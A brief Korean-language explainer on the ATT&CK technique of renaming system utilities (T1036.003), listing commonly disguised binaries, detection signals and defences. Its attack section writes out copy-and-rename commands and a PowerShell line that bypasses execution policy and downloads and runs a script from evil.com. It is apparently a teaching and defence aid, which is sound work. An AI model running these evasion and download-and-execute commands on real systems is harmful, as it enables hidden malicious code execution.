T1036.003: Rename System Utilities

Defense Evasion

Rename System Utilities

시스템 유틸리티의 이름을 변경하여 보안 도구의 탐지를 우회

#1. 시스템 유틸리티 이름 변경이란?

"변장" 비유

경찰이 수배 중인 도구(cmd.exe, powershell.exe)를 다른 이름으로 위장하는 것입니다. 보안 솔루션은 프로세스 이름을 기반으로 탐지하므로, 공격자가 cmd.exe를 notepad.exe로 이름을 변경하면 명령줄 실행이 메모장 프로세스처럼 보입니다. 이 기법은 프로세스 모니터링, AppLocker 정책, EDR 탐지를 우회합니다.

자주 위장되는 원본

  • cmd.exe → notepad.exe, explorer.exe
  • powershell.exe → svchost.exe, taskhost.exe
  • mshta.exe → calc.exe
  • certutil.exe → update.exe

탐지 포인트

  • 파일 해시 vs 이름 불일치
  • OriginalFileName PE 헤더 검증
  • 서명(Authenticode) 불일치
  • 비정상 경로에서 실행

#2. 공격 기법

# cmd.exe를 notepad.exe로 이름 변경 후 실행
copy C:\Windows\System32\cmd.exe C:\Users\Public\notepad.exe
C:\Users\Public\notepad.exe /c whoami
# EDR은 "notepad.exe"를 무해한 프로세스로 분류
# PowerShell을 svchost로 위장
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\temp\svchost.exe
C:\temp\svchost.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
# "svchost.exe"는 보안팀이 무시하기 쉬운 정상 프로세스 이름

방어 방법

  • PE 헤더 검증: OriginalFileName과 실행 파일명 비교
  • 해시 기반 탐지: cmd.exe 해시가 notepad.exe로 실행되면 탐지
  • Sysmon Event ID 1: OriginalFileName 필드 활용
  • YARA 규칙: 알려진 시스템 유틸리티의 시그니처 매칭
  • 경로 이상 탐지: System32 외 경로에서 시스템 바이너리 실행 탐지
